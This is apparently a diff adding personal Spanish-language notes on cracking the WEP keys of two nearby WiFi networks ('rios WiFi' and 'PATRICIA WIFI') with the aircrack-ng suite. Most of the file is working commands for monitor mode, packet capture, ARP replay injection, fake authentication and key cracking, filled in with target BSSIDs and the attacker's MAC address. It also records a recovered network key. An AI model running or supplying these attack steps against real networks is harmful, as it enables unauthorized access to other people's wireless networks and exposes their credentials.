@@ -1,0 +1,60 @@
+en Documents/tmp:
+
+mi mac: -h 90:fb:a6:fa:98:09
+AP a atacar:
+essid: rios WiFi
+mac: 
+
+antes que nada:
+Creo la interfaz mon0 (le pune una mac extraña) que dice q es monitor mode. Uso esta interfaz para todo lo relativo a aircrack suite
+  ~$ sudo airmon-ng start wlan0  
+(wlan0 es la interfaz que figura en ifconfig como wireless)  
+
+
+entonces hago ataque ARP para acelerar el tramite
+
+Aircrack con ataque aireplay -3 
+
+1) corro airodump para la bssid : <>  y essid : rios WiFi asi:(el channel sale de correr airodum-ng general: sudo airodump-ng mon0) 
+  ~$sudo  airodump-ng -d E0:CB:4E:6E:6A:B8 -c 6 -w rios mon0
+
+2) corro la arpreplay attack con mi mac adress (la que figura asociada a wlan0, no a mon0 por q es fruta) y usando la interfaz mon0 (la creada q esta en modo mon y puede inyectar paquetes)
+Esto lo que hace es replicar un paquete ARP con la mac autenticada (en este caso es la mia que sera falsamente autenticada)   
+  ~$aireplay-ng -3 -b E0:CB:4E:6E:6A:B8 -h 90:fb:a6:fa:98:09 mon0 
+
+
+3) con airodump corriendo , como no hay associated ids me hago asociado para mandar el arp trucho para que el 
+AP me responda con un ARP con un IV nuevo cada vez
+(aparezco en la parte de asociados en airodump) 
+  Este paso se puede saltear si ves algun client asociado a la bssid en cuestion (tenes info de historia de asociados en el kismet*.*xml)
+
+  alt1) ~$sudo aireplay -1 0 -e "rios WiFi" -a E0:CB:4E:6E:6A:B8 -h 90:fb:a6:fa:98:09 mon0
+  alt2) ~$sudo aireplay-ng -1 6000 -o 1 -q 10 -e "rios WiFi" -a E0:CB:4E:6E:6A:B8 -h 90:fb:a6:fa:98:09 mon0
+(alternativa 2 que manda keepalives cada 10 seg. es la que anda)
+
+cualquiera de las alternativas hay que hacerlas un par de veces por que no siempre consigue authenticatearse de una
+  
+4) en // al airodump corriendo y generando paquetes a lo loco corro aircrack para ver si puedo conseguir 
+una clave con la cantidad de paquetes dada. Lo dejo corriendo(mientras consigo 100 pacetes por segundo) y en algun momento lo saca, tira key found! y corta.
+  $ sudo aircrack-ng rios-01.cap
+
+Problema: 
+haciendo lo de arriba con el paso 3) alternativa uno, encontraba un solo arp y no lo podia replicar (no se veia el #data aumentando en airodump-ng ) 
+usando la alternativa de los keep alives empieza a volar como loco (replico 8500 arp y se quedo) (aparecieron death packets) 
+vuelvo a intentar autenticarme... lo logro y dejo corriendo el aircrack hasta q consigo la clave
+
+clave: 2612010348000
+
+Ataque clau
+
+1)sudo airodump-ng -d 20:E5:64:DB:4E:BC -c 6 -w rios mon1  
+2)sudo aireplay-ng -3 -b 20:E5:64:DB:4E:BC -h 90:fb:a6:fa:98:09 mon1 
+3)sudo aireplay-ng -1 6000 -o 1 -q 10 -e "PATRICIA WIFI" -a 20:E5:64:DB:4E:BC -h 90:fb:a6:fa:98:09 mon1
+
+
+
+channel 1 
+
+PATRICIA WIFI
+
+
